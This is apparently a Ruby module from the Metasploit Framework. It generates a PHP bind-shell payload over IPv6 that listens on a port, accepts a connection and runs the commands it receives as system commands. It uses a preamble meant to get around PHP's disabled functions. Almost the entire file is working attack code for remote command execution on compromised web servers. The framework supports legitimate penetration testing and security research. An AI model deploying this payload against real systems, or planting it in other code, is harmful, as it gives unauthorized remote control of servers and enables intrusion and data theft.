##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = :dynamic

  include Msf::Payload::Single
  include Msf::Payload::Php
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'PHP Command Shell, Bind TCP (via php) IPv6',
        'Description' => 'Listen for a connection and spawn a command shell via php (IPv6)',
        'Author' => ['egypt', 'diaul <diaul[at]devilopers.org>',],
        'License' => BSD_LICENSE,
        'Platform' => 'php',
        'Arch' => ARCH_PHP,
        'Handler' => Msf::Handler::BindTcp,
        'Session' => Msf::Sessions::CommandShell,
        'PayloadType' => 'cmd',
        'Payload' => {
          'Offsets' => {},
          'Payload' => ''
        }
      )
    )
  end

  #
  # PHP Bind Shell
  #
  def php_bind_shell
    dis = '$' + Rex::Text.rand_text_alpha(4..7)
    shell = <<-END_OF_PHP_CODE
    #{php_preamble({ disabled_varname: dis })}
    $port=#{datastore['LPORT']};

    $scl='socket_create_listen';
    if(is_callable($scl)&&!in_array($scl,#{dis})){
      $sock=@$scl($port);
    }else{
      $sock=@socket_create(AF_INET6,SOCK_STREAM,SOL_TCP);
      $ret=@socket_bind($sock,0,$port);
      $ret=@socket_listen($sock,5);
    }
    $msgsock=@socket_accept($sock);
    @socket_close($sock);

    while(FALSE!==@socket_select($r=array($msgsock), $w=NULL, $e=NULL, NULL))
    {
      $o = '';
      $c=@socket_read($msgsock,2048,PHP_NORMAL_READ);
      if(FALSE===$c){break;}
      if(substr($c,0,3) == 'cd '){
        chdir(substr($c,3,-1));
      } else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') {
        break;
      }else{
        #{php_system_block({ cmd_varname: '$c', output_varname: '$o', disabled_varname: dis })}
      }
      @socket_write($msgsock,$o,strlen($o));
    }
    @socket_close($msgsock);
    END_OF_PHP_CODE

    return shell
  end

  #
  # Constructs the payload
  #
  def generate(_opts = {})
    return super + php_bind_shell
  end
end
